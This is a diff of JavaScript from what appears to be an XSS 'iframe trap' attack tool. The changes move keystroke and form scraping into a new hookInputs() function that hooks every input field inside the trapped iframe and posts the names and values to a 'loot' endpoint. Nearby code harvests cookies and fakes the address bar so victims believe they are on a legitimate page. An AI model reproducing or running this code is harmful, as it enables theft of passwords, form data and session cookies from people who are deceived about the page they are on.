@@ -162,16 +162,44 @@ function sendScreenshot()
 
 
 
-// // Captures user inputs changes
-// function updateInput(input)
-// {
-// 	inputName = input.target.name;
-// 	inputValue = input.target.value;
 
 
-// 	console.log("!!!! Input: " + inputName + " changed to: " + inputvalue);
+// Hook all the inputs so we can capture what was typed
+// Called a lot to make sure we don't miss some input
+// Code checks (attributes) makes sure we don't register 
+// events multiple times
+function hookInputs()
+{
+	inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
+	for (index = 0; index < inputs.length; index++)
+	{
+		// Check to see if we've already hooked the input field. 
+		// We can just use our own custom attribute to track, if it's
+		// already hooked then skip it. If that attribute is missing, something happened
+		// like a page change, but maybe the actual URL didn't change. 
+		if (inputs[index].getAttribute("tappedState") != "true")
+		{
+			//console.log("!! Setting tappedState attribute on element index: " + index);
+			inputs[index].setAttribute("tappedState", "true");
 
-// }
+			// Adding event listeners to fire when the value in submitted 
+			addEventListener(inputs[index], (event) => updateInput);
+			inputs[index].addEventListener("change", function(){
+				inputName = this.name;
+				inputValue = this.value;
+				request = new XMLHttpRequest();
+				request.open("POST", "http://localhost:8444/loot/input/" + sessionName);
+				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+				var jsonObj = new Object();
+				jsonObj["inputName"] = inputName;
+				jsonObj["inputValue"] = inputValue;
+				var jsonString = JSON.stringify(jsonObj);
+				request.send(jsonString);
+			});
+		}
+	}
+}
+
 
 
 
@@ -182,7 +210,7 @@ function sendScreenshot()
 // Also updates their browser address bar so they 
 // think they're on the page they're viewing in the
 // iframe trap, not the one with the XSS vuln. 
-function updateUrl()
+function runUpdate()
 {
 	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
 
@@ -209,28 +237,7 @@ function updateUrl()
 
 
 		// Handle input scraping
-		inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
-		for (index = 0; index < inputs.length; index++)
-		{
-			//console.log("++ Registering input callballback for index: " + index)
-			// Adding event listeners to fire when the value in submitted 
-			addEventListener(inputs[index], (event) => updateInput);
-			inputs[index].addEventListener("change", function(){
-				inputName = this.name;
-				inputValue = this.value;
-				// console.log("!!!! Input: " + inputName + " changed to: " + inputValue);
-
-				request = new XMLHttpRequest();
-				request.open("POST", "http://localhost:8444/loot/input/" + sessionName);
-				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-				var jsonObj = new Object();
-				jsonObj["inputName"] = inputName;
-				jsonObj["inputValue"] = inputValue;
-				var jsonString = JSON.stringify(jsonObj);
-				request.send(jsonString);
-			});
-		}
-
+		hookInputs();
 
 		// Handle Cookies
 		cookieArray = document.cookie.split(';');
@@ -255,6 +262,10 @@ function updateUrl()
 	// 	console.log("Fake URL doesn't need updating");
 
 
+
+	// Updates that need to happen constantly
+	// hooking inputs, we can miss them otherwise
+	hookInputs();
 
 
 	// Fake the URL that the user sees. This is important. 
@@ -300,13 +311,13 @@ function takeOver()
 	// Hook needed events below...
 
 	// Just register all the darned events, each event in the iframe
-	// we'll call updateUrl()
+	// we'll call runUpdate()
 	var myIframe = document.getElementById('iframe_a');
 
 	// Hook all the things for URL faking
 	for(var key in myIframe){
 		if(key.search('on') === 0) {
-			myIframe.addEventListener(key.slice(2), updateUrl);
+			myIframe.addEventListener(key.slice(2), runUpdate);
 		}
 	}
 
